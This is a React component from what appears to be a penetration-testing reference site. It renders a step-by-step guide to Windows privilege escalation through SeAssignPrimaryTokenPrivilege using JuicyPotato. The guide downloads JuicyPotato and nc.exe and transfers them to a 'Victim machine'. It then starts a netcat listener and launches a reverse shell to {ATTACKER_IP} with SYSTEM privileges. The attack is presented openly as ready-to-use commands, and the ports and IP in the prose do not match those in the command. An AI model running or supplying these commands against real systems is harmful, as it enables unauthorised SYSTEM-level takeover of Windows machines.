import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const SeAssignPrimaryTokenJuicyPotato = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Requirements</Typography>
            <Typography>
              JuicyPotato doesn't work on Windows Server 2019 and Windows 10
              build 1809 onwards.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Description</Typography>
            <Typography>
              The SeAssignPrimaryTokenPrivilege policy setting allows a process
              to replace a process level token.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>Download JuicyPotato</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>Download Netcat</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"wget https://github.com/int0x33/nc.exe/raw/master/nc.exe"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Transfer JuicyPotato and Netcat to the Victim machine.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>Start a Netcat listener on Attacker machine</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"nc -lvnp 4444"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>
              Execute JuicyPotato. `-l 53375` is the COM listening port. `-p
              c:\windows\system32\cmd.exe` is the program to launch. `-a "/c
              c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe"`. `-t *` is the
              createprocess call.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                'c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a "/c c:\\tools\\nc.exe {ATTACKER_IP} 4444 -e cmd.exe" -t *'
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 6</Typography>
            <Typography>
              After execution, you should have a shell as NT Authority\System
            </Typography>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default SeAssignPrimaryTokenJuicyPotato;
